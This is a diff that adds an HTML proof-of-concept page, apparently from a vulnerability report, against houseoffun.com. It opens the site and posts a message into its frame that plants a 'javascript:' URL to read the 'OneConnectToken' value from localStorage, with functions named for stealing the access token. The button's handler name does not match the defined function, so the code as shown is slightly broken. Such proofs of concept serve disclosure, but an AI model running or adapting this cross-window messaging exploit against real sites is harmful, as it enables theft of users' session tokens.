@@ -1,0 +1,26 @@
+<html>
+
+<body>
+
+    <button onclick="open_houseoffun()">click me to open www.houseoffun.com</button>
+    <button onclick="steal_accesstoken()">click me for the token</button>
+
+    <script>
+        async function open_cleartrip() {
+
+            win_attcker = window.open("https://www.houseoffun.com/play-now/");
+
+        }
+
+        function steal_accesstoken() {
+
+            win_attcker.frames[0].postMessage({
+                "func": "getLocalStorageKey",
+                "key": "savedSupportUrl",
+                "data": "javascript:alert(localStorage['OneConnectToken'])//"
+            }, "*")
+        }
+    </script>
+</body>
+
+</html>
